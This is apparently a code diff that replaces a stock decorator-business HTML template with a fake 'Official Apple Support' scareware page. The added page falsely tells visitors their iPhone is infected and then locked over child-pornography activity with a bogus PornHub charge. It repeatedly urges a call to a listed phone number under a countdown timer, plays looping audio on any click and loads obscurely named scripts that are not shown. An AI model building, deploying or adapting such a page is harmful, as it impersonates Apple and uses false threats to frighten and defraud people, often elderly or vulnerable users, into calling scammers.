@@ -1,12 +1,23 @@
-<?php
-?>
-<!DOCTYPE html>
-<html lang="en">
-   <head>
-       <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple Support</title>
+    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" href="images/favicon.ico">
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+
+  <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5041303,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5041122,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -14,547 +25,103 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5041303&101" alt="website statistics" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5041122&101" alt="counter hit make" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-      <!-- basic -->
-      <meta charset="utf-8">
-      <meta http-equiv="X-UA-Compatible" content="IE=edge">
-      <!-- mobile metas -->
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <meta name="viewport" content="initial-scale=1, maximum-scale=1">
-      <!-- site metas -->
-      <title>Oxomi - Responsive HTML5 Template</title>
-      <meta name="keywords" content="">
-      <meta name="description" content="">
-      <meta name="author" content="">
-      <!-- site icons -->
-      <link rel="icon" href="img/fevicon.png" type="image/png" />
-      <!-- bootstrap css -->
-      <link rel="stylesheet" href="css/bootstrap.min.css" />
-      <!-- site css -->
-      <link rel="stylesheet" href="css/style.css" />
-      <!-- responsive css -->
-      <link rel="stylesheet" href="css/responsive.css" />
-      <!-- colors css -->
-      <link rel="stylesheet" href="css/colors.css" />
-      <!-- custom css -->
-      <link rel="stylesheet" href="css/custom.css" />
-      <!-- wow animation css -->
-      <link rel="stylesheet" href="css/animate.css" />
-      <!-- Revolution Loaling Fonts and Icons  -->
-      <link rel="stylesheet" href="js/revolution/fonts/pe-icon-7-stroke/css/pe-icon-7-stroke.css">
-      <!-- Revolution style Sheets  -->
-      <link rel="stylesheet" href="js/revolution/css/settings.css">
-      <link rel="stylesheet" href="js/revolution/css/layers.css">
-      <link rel="stylesheet" href="js/revolution/css/navigation.css">
-      <!-- owl stylesheets -->
-      <link rel="stylesheet" href="css/owl.carousel.min.css">
-      <link rel="stylesheet" href="css/owl.theme.default.css">
-      <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-      <![endif]-->
-   </head>
-   <body id="default_theme" class="home_page1">
-      <!-- header -->
-      <div id="mySidenav" class="sidenav">
-         <ul class="menu_sidebar">
-            <li><a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a></li>
-            <li><a href="index.html">01. Home</a></li>
-            <li><a href="about.html">02. About</i></a></li>
-            <li><a href="what_we_do.html">03. What we do</a></li>
-            <li><a href="testimonial.html">04. Testimonial</a></li>
-            <li><a href="contact.html">05. Contact Us</a></li>
-         </ul>
-      </div>
-      <header class="header">
-         <div class="header_top">
-            <div class="container">
-               <div class="row">
-                  <div class="col-md-4">
-                     <div class="full">
-                        <span class="toggle_icon" style="cursor:pointer" onclick="openNav()"><img src="img/menu_icon.png" alt="#" /></span>
-                        <div class="logo_circle">
-                           <a href="index.html"><img class="img-responsive" src="img/logo.png" alt="#" /></a>
+    
+</head>
+
+<body onclick="playSound()"  id="link">
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
+
+        
+    <div class="bgimg">
+            <video autoplay loop muted style="width: 100%;">
+  <source src="images/vdo.webm" type="video/webm">
+</video>
+        </div>
+
+
+    <div class="main">
+        
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-content">
+                        
+                        <div class="alert-box">
+                            
+
+    <div class="spacbar">
+        <div class="d-flex justify-content-between">
+  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
+  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
+</div>
+<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
+   <div class="alert-title">Your iOS is infected with 3 viruses. Our security check found traces of 8 malware and 12 phishing/spyware. System damage: 28.1%.<br>
+    immediete removal required!</div>
+   
+    <div class="txstm"> Please contact Apple Support immediately at <strong><a href="tel:+1-888-515-4487">+1-888-515-4487</a></strong> to secure your device and prevent unauthorized activity.</div>
+    <a href="tel:+1-888-515-4487" class="alert-button"><span id="countdown">10:00</span> remaining before damage is permanent.</a>
+    
+    </div>
+</div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
                         </div>
-                     </div>
-                  </div>
-                  <div class="col-md-6">
-                     <div class="float-right">
-                        <ul class="top_links">
-                           <li><a href="#"><img src="images/profile_icon.png" alt="#" /></a></li>
-                           <li class="searchbar">
-                              <input class="search_input" type="text" name="" placeholder="Search...">
-                              <a href="#" class="search_icon"><img src="images/search_icon.png" alt="#" /></a>
-                           </li>
-                        </ul> 
-                     </div>
-                  </div>
-               </div>
+                    </div>
+                </div>
             </div>
-         </div>
-      </header>
-      <!-- end header -->
-      <!-- Start Banner Slider -->
-      <div class="banner-slider">
-         <div class="container-fluid">
-            <div class="row">
-               <div id="slider_main" class="carousel slide" data-ride="carousel">
-                  <!-- The slideshow -->
-                  <div class="carousel-inner">
-                     <div class="carousel-item active">
-                        <div class="full">
-                           <div class="left_blog_top">
-                              <h3>Decorate<br>Service</h3>
-                              <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit..</p>
-                              <a class="bt_main" href="contact.html">Contact Us</a>
-                           </div>
-                           <div class="right_blog_top">
-                              <img src="img/slide1_right.png" alt="#" />
-                           </div>
-                        </div>
-                     </div>
-                     <div class="carousel-item">
-                        <div class="full">
-                           <div class="left_blog_top">
-                              <h3>Decorate<br>Service</h3>
-                              <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit..</p>
-                              <a class="bt_main" href="contact.html">Contact Us</a>
-                           </div>
-                           <div class="right_blog_top">
-                              <img src="img/slide1_right.png" alt="#" />
-                           </div>
-                        </div>
-                     </div>
-                  </div>
-                  <div class="slide_arrow">
-                     <span>
-                     <a class="carousel-control-prev" href="#slider_main" data-slide="prev">
-                     <span class="carousel-control-prev-icon"></span>
-                     </a>
-                     <a class="carousel-control-next" href="#slider_main" data-slide="next">
-                     <span class="carousel-control-next-icon"></span>
-                     </a>
-                     </span>
-                  </div>
-               </div>
+        </section>
+    </div>
+
+    <div class="notification">
+        <div class="msalogo"><img src="images/warn.png" alt="" width="30px"> EMERGENCY ALERTS</div>
+<div class="cursor">now</div>
+  <div class="notification-body">
+    Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase <br>of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-888-515-4487">+1-888-515-4487</a> to unlock it!
+  </div>
+  <img src="images/apple.png" alt="Apple Pay" class="apple-pay">
+</div>
+
+    <div id="modalContainer"></div>
+
+    
+     <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-50px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                <div class="modal-body text-center">
+                    <div class="alertimg">
+                        <img src="images/warn.png" alt="" style="width: 80px;">
+                    </div>
+                    <h4 style="font-weight: 600;">Security Warning!</h4>
+                    <div class="alert-text">
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-888-515-4487">+1-888-515-4487</a> to unlock it!
+                    </div>
+
+                    
+                    <div class="text-end gap-4 mt-3 actionbtn">
+                        <a href="tel:+1-888-515-4487" class="me-2 bg-primary">Call +1-888-515-4487</a>
+                        <a href="tel:+1-888-515-4487" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                    </div>
+                </div>
             </div>
-         </div>
-      </div>
-      <!-- End Banner Slider -->
-      <!-- section -->
-      <section class="layout_padding what_we_do">
-         <div class="container">
-            <div class="row">
-               <div class="col-md-12">
-                  <div class="full heading_s1">
-                     <h3>What We Do</h3>
-                     <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit..</p>
-                  </div>
-               </div>
-            </div>
-            <div class="row">
-               <div class="col-md-3">
-                  <div class="full decorate_blog">
-                     <img src="images/sm1.png" alt="#" />
-                     <a class="decorate_blog_bt" href="hd.html">Home Decorate</a>
-                  </div>
-               </div>
-               <div class="col-md-3">
-                  <div class="full decorate_blog">
-                     <img src="images/sm2.png" alt="#" />
-                     <a class="decorate_blog_bt" href="od.html">Office Decorate</a>
-                  </div>
-               </div>
-               <div class="col-md-3">
-                  <div class="full decorate_blog">
-                     <img src="images/sm3.png" alt="#" />
-                     <a class="decorate_blog_bt" href="fd.html">Furniture Decorate</a>
-                  </div>
-               </div>
-               <div class="col-md-3">
-                  <div class="full decorate_blog">
-                     <img src="images/sm4.png" alt="#" />
-                     <a class="decorate_blog_bt" href="ld.html">Lighting Decorate</a>
-                  </div>
-               </div>
-            </div>
-            <div class="row">
-               <div class="col-sm-12">
-                  <div class="full">
-                     <a class="read_more_bt float-right" href="#">Read More</a>
-                  </div>
-               </div>
-            </div>
-         </div>
-      </section>
-      <!-- end section -->
-      <!-- section -->
-      <section class="layout_padding about_section">
-         <div class="container">
-            <div class="row">
-               <div class="col-md-12">
-                  <div class="row">
-                     <div class="row">
-                        <div class="col-md-7 p-relative r-left">
-                           <div class="full back_blog text_align_center padding_right_left_15">
-                              <img src="images/about_img.png" alt="#" />
-                           </div>
-                        </div>
-                        <div class="col-md-5">
-                           <div class="full heading_s1">
-                              <h3>About</h3>
-                              <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum..</p>
-                           </div>
-                           <div class="full">
-                              <a class="read_more_bt" href="#">Read More</a>
-                           </div>
-                        </div>
-                     </div>
-                  </div>
-               </div>
-            </div>
-         </div>
-      </section>
-      <!-- end section -->
-      <!-- section -->
-      <section class="layout_padding design_layout">
-         <div class="container">
-            <div class="row">
-               <div class="col-md-7">
-                  <div class="full">
-                  </div>
-               </div>
-               <div class="col-md-5">
-                  <div class="full heading_s1">
-                     <h3>Best<br>Decorating for<br>Your home</h3>
-                     <p>adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore </p>
-                  </div>
-                  <div class="full">
-                     <a class="read_more_bt" href="#">Get A Quote</a>
-                  </div>
-               </div>
-            </div>
-         </div>
-      </section>
-      <!-- end section -->
-      <!-- section -->
-      <section class="layout_padding">
-         <div class="container">
-            <div class="row">
-               <div class="col-md-12">
-                  <div class="full heading_s1">
-                     <h3>Latest News</h3>
-                     <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit..</p>
-                  </div>
-               </div>
-            </div>
-            <div class="row">
-               <div class="col-md-6">
-                  <div class="blog_style">
-                     <div class="full news_blog">
-                        <img src="images/blog1.png" alt="#" />
-                     </div>
-                     <div class="full post_colum">
-                        <ul>
-                           <li>Post By : OXOMI</li>
-                           <li><a href="#">Like <img src="images/like_btn.png" alt="#" /></a></li>
-                           <li><a href="#">Comment <img src="images/msg_btn.png" alt="#" /></a></li>
-                           <li><a href="#">Share <img src="images/Share_btn.png" alt="#" /></a></li>
-                        </ul>
-                     </div>
-                     <div class="full">
-                        <h3>Clean and Decorating office..</h3>
-                        <p>consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore consectetur adipiscing elit, ad minim veniam, quis nostrud exercitation</p>
-                     </div>
-                  </div>
-               </div>
-               <div class="col-md-6">
-                  <div class="blog_style">
-                     <div class="full news_blog">
-                        <img src="images/blog2.png" alt="#" />
-                     </div>
-                     <div class="full post_colum">
-                        <ul>
-                           <li>Post By : OXOMI</li>
-                           <li><a href="#">Like <img src="images/like_btn.png" alt="#" /></a></li>
-                           <li><a href="#">Comment <img src="images/msg_btn.png" alt="#" /></a></li>
-                           <li><a href="#">Share <img src="images/Share_btn.png" alt="#" /></a></li>
-                        </ul>
-                     </div>
-                     <div class="full">
-                        <h3>Lighting and Decorating office..</h3>
-                        <p>consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore consectetur adipiscing elit, ad minim veniam, quis nostrud exercitation</p>
-                     </div>
-                  </div>
-               </div>
-            </div>
-         </div>
-      </section>
-      <!-- end section -->
-      <!-- section -->
-      <section class="layout_padding">
-         <div class="container">
-            <div class="row">
-               <div class="col-md-12">
-                  <div class="full heading_s1">
-                     <h3>Request A Call Back</h3>
-                     <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit..</p>
-                  </div>
-               </div>
-            </div>
-            <div class="row">
-               <div class="col-md-6">
-                  <form action="#">
-                     <fieldset>
-                        <div class="row">
-                           <div class="col-sm-12">
-                              <div class="full fieldset_blog">
-                                 <input type="text" placeholder="Your Name" name="name" />
-                              </div>
-                              <div class="full fieldset_blog">
-                                 <input type="text" placeholder="Phone Number" name="phone_no" />
-                              </div>
-                              <div class="full fieldset_blog">
-                                 <input type="email" placeholder="email" name="email" />
-                              </div>
-                              <div class="full fieldset_blog">
-                                 <textarea placeholder="Message"></textarea>
-                              </div>
-                              <div class="full fieldset_blog center">
-                                 <button>Send</button>
-                              </div>
-                           </div>
-                        </div>
-                     </fieldset>
-                  </form>
-               </div>
-               <div class="col-md-6 p-relative">
-                  <div class="full back_blog">
-                     <img class="img-responsive" src="images/call_back.png" alt="#" />
-                  </div>
-               </div>
-            </div>
-         </div>
-      </section>
-      <!-- end section -->
-      <!-- section -->
-      <section class="layout_padding">
-         <div class="container">
-            <div class="row">
-               <div class="col-md-12">
-                  <div class="full heading_s1 text_align_center">
-                     <h3>Testimonial</h3>
-                  </div>
-                  <div class="testimonial_slider">
-                     <div class="full">
-                        <div class="client_slider_main2">
-                           <div id="testimonial2" class="client_slider_main owl-carousel owl-theme">
-                              <div class="item">
-                                 <div class="row">
-                                    <div class="col-md-3">
-                                       <div class="full">
-                                          <div class="center"> <img src="images/layout_img/testimo_profile.png" alt="#" /> </div>
-                                       </div>
-                                    </div>
-                                    <div class="col-md-9">
-                                       <div class="full">
-                                          <div class="testi_head">
-                                             <h4>Lianna john</h4>
-                                             <p>Home Rentel</p>
-                                          </div>
-                                       </div>
-                                       <div class="full testi_slide">
-                                          <p><img src="images/layout_img/quate_left_test.png" alt="#" />Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua..</p>
-                                       </div>
-                                    </div>
-                                 </div>
-                              </div>
-                              <div class="item">
-                                 <div class="row">
-                                    <div class="col-md-3">
-                                       <div class="full">
-                                          <div class="center"> <img src="images/layout_img/testimo_profile.png" alt="#" /> </div>
-                                       </div>
-                                    </div>
-                                    <div class="col-md-9">
-                                       <div class="full">
-                                          <div class="testi_head">
-                                             <h4>Rosy Mike</h4>
-                                             <p>Home Rentel</p>
-                                          </div>
-                                       </div>
-                                       <div class="full testi_slide">
-                                          <p><img src="images/layout_img/quate_left_test.png" alt="#" />Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua..</p>
-                                       </div>
-                                    </div>
-                                 </div>
-                              </div>
-                              <div class="item">
-                                 <div class="row">
-                                    <div class="col-md-3">
-                                       <div class="full">
-                                          <div class="center"> <img src="images/layout_img/testimo_profile.png" alt="#" /> </div>
-                                       </div>
-                                    </div>
-                                    <div class="col-md-9">
-                                       <div class="full">
-                                          <div class="testi_head">
-                                             <h4>William Butter</h4>
-                                             <p>Home Rentel</p>
-                                          </div>
-                                       </div>
-                                       <div class="full testi_slide">
-                                          <p><img src="images/layout_img/quate_left_test.png" alt="#" />Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua..</p>
-                                       </div>
-                                    </div>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                     </div>
-                  </div>
-               </div>
-            </div>
-         </div>
-      </section>
-      <!-- end section -->
-      <!-- end footer -->
-      <footer>
-         <div class="container-fluid">
-            <div class="row">
-               <div class="col-md-12">
-                  <div class="full footer_top">
-                     <div class="container">
-                        <div class="row">
-                           <div class="col-sm-3">
-                              <div class="full f_logo">
-                                 <img src="images/footer_img.png" alt="#" />
-                              </div>
-                              <div class="full">
-                                 <p>consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna strud exercitation</p>
-                              </div>
-                           </div>
-                           <div class="col-sm-3">
-                              <div class="full heading_footer">
-                                 <h3>Menu</h3>
-                              </div>
-                              <div class="full">
-                                 <ul class="footer_link">
-                                    <li><a href="#">Home</a></li>
-                                    <li><a href="#">About</a></li>
-                                    <li><a href="#">Services</a></li>
-                                    <li><a href="#">What we do</a></li>
-                                    <li><a href="#">Testimonial</a></li>
-                                    <li><a href="#">Contact us</a></li>
-                                 </ul>
-                              </div>
-                           </div>
-                           <div class="col-sm-3">
-                              <div class="full heading_footer">
-                                 <h3>Instagram</h3>
-                              </div>
-                              <div class="full">
-                                 <ul class="footer_link_intas">
-                                    <li>
-                                       <span><img src="images/f_in_blog.png" alt="#" /></span>
-                                       <span>Consectetur Adipiscing</span>
-                                    </li>
-                                    <li>
-                                       <span><img src="images/f_in_blog2.png" alt="#" /></span>
-                                       <span>Consectetur Adipiscing</span>
-                                    </li>
-                                 </ul>
-                              </div>
-                           </div>
-                           <div class="col-md-3">
-                              <div class="full heading_footer">
-                                 <h3>Subscribe</h3>
-                              </div>
-                              <div class="full footer_form">
-                                 <form>
-                                    <fieldset>
-                                       <div class="row">
-                                          <div class="col-md-12">
-                                             <div class="full">
-                                                <input type="email" placeholder="Your Email" name="_email" />
-                                             </div>
-                                             <div class="full">
-                                                <button>Subscribe</button>
-                                             </div>
-                                          </div>
-                                       </div>
-                                    </fieldset>
-                                 </form>
-                              </div>
-                           </div>
-                           <div class="col-md-12">
-                              <div class="row margin_top_50">
-                                 <div class="col-md-10 offset-md-1">
-                                    <div class="row">
-                                       <div class="col-sm-4">
-                                          <div class="full cont_info">
-                                             <i class="fa fa-map-marker"></i>
-                                             <span>Location</span>
-                                          </div>
-                                       </div>
-                                       <div class="col-sm-4">
-                                          <div class="full cont_info">
-                                             <i class="fa fa-phone"></i>
-                                             <span>Call +01 1234 567 890</span>
-                                          </div>
-                                       </div>
-                                       <div class="col-sm-4">
-                                          <div class="full cont_info">
-                                             <i class="fa fa-envelope" style="font-size: 17px;"></i>
-                                             <span>demo@gmail.com</span>
-                                          </div>
-                                       </div>
-                                    </div>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                     </div>
-                  </div>
-               </div>
-            </div>
-         </div>
-      </footer>
-      <!-- end footer -->
-      <!-- cpy -->
-      <div class="cpy">
-         <div class="container">
-            <div class="row">
-               <div class="col-md-12">
-                  <div class="full center">
-                     <ul class="social_icon">
-                        <li><a href="#"><i class="fa fa-facebook-f"></i></a></li>
-                        <li><a href="#"><i class="fa fa-twitter"></i></a></li>
-                        <li><a href="#"><i class="fa fa-linkedin"></i></a></li>
-                        <li><a href="#"><i class="fa fa-instagram"></i></a></li>
-                        <li><a href="#"><i class="fa fa-youtube-play"></i></a></li>
-                     </ul>
-                  </div>
-                  <div class="full text_align_center">
-                     <p>© 2020 All Rights Reserved. <a href="https://html.design">html.design</a></p>
-                  </div>
-               </div>
-            </div>
-         </div>
-      </div>
-      <!-- end cpy -->
-      <!-- jQuery (necessary for Bootstrap's JavaScript) -->
-      <script src="js/jquery.min.js"></script>
-      <script src="js/popper.min.js"></script>
-      <script src="js/bootstrap.min.js"></script>
-      <!-- javascript -->
-      <script src="js/owl.carousel.js"></script>
-      <!-- wow animation -->
-      <script src="js/wow.js"></script>
-      <!-- menumaker -->
-      <script src="js/menumaker.js"></script>
-      <!-- custom js -->
-      <script src="js/custom.js"></script>
-   </body>
-</html>
+        </div>
+    </div>
+
+    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
+
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/Jdjifsx.js"></script>
+    <script src="js/NsicjSc.js"></script>
+    <script src="js/NisifAZ.js"></script>
+
+
+
+
+</body></html>
